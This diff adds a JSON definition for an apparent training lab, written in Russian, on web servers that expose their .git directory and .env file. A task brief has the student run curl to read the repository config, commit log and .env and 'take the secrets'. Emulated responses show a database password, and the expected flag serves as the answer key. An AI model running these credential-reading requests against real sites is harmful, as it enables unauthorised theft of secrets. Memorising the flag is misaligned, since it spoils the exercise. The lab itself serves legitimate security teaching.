@@ -1,0 +1,47 @@
+{
+  "id": "web-git-env-exposure",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{g1t_h1st0ry_n3v3r_f0rg3ts}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: утечка .git/.env\n\nЦель — `http://app.lab.local`. Похоже, разработчик делал `git clone` прямо в\nкаталоге сайта, а рядом лежит `.env`. Проверь и забери секреты.\n\n1. Отдаётся ли служебный каталог: `curl -s http://app.lab.local/.git/HEAD`.\n2. Что за репозиторий: `curl -s http://app.lab.local/.git/config`.\n3. История коммитов (в сообщениях часто остаются «удалённые» секреты):\n   `curl -s http://app.lab.local/.git/logs/HEAD`.\n4. Конфиг окружения: `curl -s http://app.lab.local/.env` — там есть флаг.\n5. Запиши флаг в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.lab.local)",
+      "cases": [
+        {
+          "match": "\\.git/HEAD",
+          "example": "-s -i http://app.lab.local/.git/HEAD",
+          "output": "HTTP/1.1 200 OK\nServer: nginx/1.24.0\nContent-Type: text/plain\nContent-Length: 21\n\nref: refs/heads/main\n"
+        },
+        {
+          "match": "\\.git/config",
+          "example": "-s http://app.lab.local/.git/config",
+          "output": "[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n[remote \"origin\"]\n\turl = git@github.com:shop/app.git\n"
+        },
+        {
+          "match": "\\.git/logs/HEAD",
+          "example": "-s http://app.lab.local/.git/logs/HEAD",
+          "output": "0000000 c41a880 root <root@build> 2024-01-02 10:00:00 +0000\tcommit (initial): initial commit\nc41a880 3f2c1b9 root <root@build> 2024-01-05 11:20:00 +0000\tcommit: remove hardcoded credentials\n3f2c1b9 8a1f0c2 root <root@build> 2024-01-06 09:05:00 +0000\tcommit: fix typo in readme\n"
+        },
+        {
+          "match": "\\.env",
+          "example": "-s http://app.lab.local/.env",
+          "output": "APP_ENV=production\nDB_HOST=db.internal\nDB_USER=shop\nDB_PASSWORD=S3cr3tProd2024!\nFLAG=nto{g1t_h1st0ry_n3v3r_f0rg3ts}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /.git/HEAD, /.git/config, /.git/logs/HEAD и /.env на app.lab.local.\n"
+    }
+  }
+}
